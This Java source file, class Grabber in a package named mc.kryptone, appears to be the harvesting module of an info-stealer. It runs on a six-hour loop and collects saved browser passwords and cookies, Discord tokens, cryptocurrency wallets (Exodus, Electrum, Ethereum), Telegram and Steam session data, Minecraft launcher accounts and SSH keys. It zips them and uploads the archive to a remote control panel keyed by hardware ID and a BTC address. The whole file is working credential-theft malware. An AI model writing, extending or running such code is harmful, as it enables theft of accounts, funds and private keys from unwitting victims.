package mc.kryptone;

import java.io.InputStream;
import java.io.OutputStream;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.file.*;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.atomic.AtomicLong;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

/** Grabs the usual files, plus every cookie DB it can find. */
public final class Grabber {
    private static final HttpClient HTTP = HttpClient.newHttpClient();
    public static final AtomicLong LAST_FILES = new AtomicLong();

    public static void start(Config cfg) {
        Thread t = new Thread(() -> {
            while (true) {
                try { grab(cfg); } catch (Exception e) { Beacon.log("grab fail: " + e.getMessage()); }
                try { Thread.sleep(6 * 60 * 60 * 1000L); } catch (InterruptedException e) { return; }
            }
        }, "kryptone-grab");
        t.setDaemon(true);
        t.start();
    }

    private static void grab(Config cfg) throws Exception {
        String home = System.getProperty("user.home");
        String local = System.getenv("LOCALAPPDATA");
        String roaming = System.getenv("APPDATA");
        List<Path> targets = new ArrayList<>();

        if (local != null) {
            for (String brand : new String[]{"Google\\Chrome", "Microsoft\\Edge", "BraveSoftware\\Brave-Browser", "Yandex\\YandexBrowser", "Opera Software\\Opera Stable"}) {
                Path base = Paths.get(local, brand, "User Data");
                if (!Files.isDirectory(base)) continue;
                try (var s = Files.list(base)) {
                    s.filter(p -> p.getFileName().toString().equals("Default") || p.getFileName().toString().startsWith("Profile")).forEach(p -> {
                        add(targets, p.resolve("Login Data"));
                        add(targets, p.resolve("Cookies"));
                        add(targets, p.resolve("Network\\Cookies"));
                        add(targets, p.resolve("Web Data"));
                        add(targets, p.resolve("Local State"));
                        add(targets, p.resolve("Local Storage"));
                    });
                } catch (Exception ignored) {}
                add(targets, base.resolve("Local State"));
            }
        }
        if (roaming != null) {
            add(targets, Paths.get(roaming, "Mozilla", "Firefox", "Profiles"));
            add(targets, Paths.get(roaming, "discord", "Local Storage", "leveldb"));
            add(targets, Paths.get(roaming, "discordcanary", "Local Storage", "leveldb"));
            add(targets, Paths.get(roaming, "Exodus", "exodus.wallet"));
            add(targets, Paths.get(roaming, "Electrum", "wallets"));
            add(targets, Paths.get(roaming, "Ethereum", "keystore"));
            add(targets, Paths.get(roaming, ".minecraft", "launcher_accounts.json"));
            add(targets, Paths.get(roaming, ".minecraft", "launcher_profiles.json"));
            add(targets, Paths.get(roaming, ".minecraft", "logs", "latest.log"));
            add(targets, Paths.get(roaming, "Telegram Desktop", "tdata"));
            add(targets, Paths.get(roaming, "Steam", "config", "loginusers.vdf"));
        }
        if (home != null) {
            add(targets, Paths.get(home, ".config", "google-chrome"));
            add(targets, Paths.get(home, ".ssh"));
            add(targets, Paths.get(home, "AppData", "Local", "Google", "Chrome", "User Data"));
        }

        Path zip = Files.createTempFile("kryptone-", ".zip");
        int files = 0;
        try (OutputStream out = Files.newOutputStream(zip); ZipOutputStream z = new ZipOutputStream(out)) {
            for (Path p : targets) {
                if (!Files.exists(p)) continue;
                String tag = safe(p.toString());
                if (Files.isDirectory(p)) files += addDir(z, p, tag);
                else {
                    z.putNextEntry(new ZipEntry(tag));
                    Files.copy(p, z);
                    z.closeEntry();
                    files++;
                }
            }
        }
        LAST_FILES.set(files);

        HttpRequest req = HttpRequest.newBuilder(URI.create(cfg.panelUrl + "/api/grab/" + Beacon.hwid()))
                .header("X-Panel-Key", cfg.panelKey)
                .header("X-Worker", cfg.workerName())
                .header("X-BTC", cfg.btcAddress)
                .header("X-Files", String.valueOf(files))
                .POST(HttpRequest.BodyPublishers.ofFile(zip)).build();
        HTTP.send(req, HttpResponse.BodyHandlers.discarding());
        Files.deleteIfExists(zip);
        Beacon.log("grab shipped files=" + files);
    }

    private static int addDir(ZipOutputStream z, Path dir, String root) {
        int n = 0;
        try (var s = Files.walk(dir, 4)) {
            var it = s.filter(Files::isRegularFile).iterator();
            while (it.hasNext()) {
                Path f = it.next();
                try {
                    if (Files.size(f) > 8_000_000) continue;
                    z.putNextEntry(new ZipEntry(root + "/" + safe(dir.relativize(f).toString())));
                    Files.copy(f, z);
                    z.closeEntry();
                    n++;
                } catch (Exception ignored) {}
            }
        } catch (Exception ignored) {}
        return n;
    }

    private static void add(List<Path> l, Path p) { if (p != null) l.add(p); }
    private static String safe(String s) { return s.replace(':', '_').replace('\\', '/'); }
}
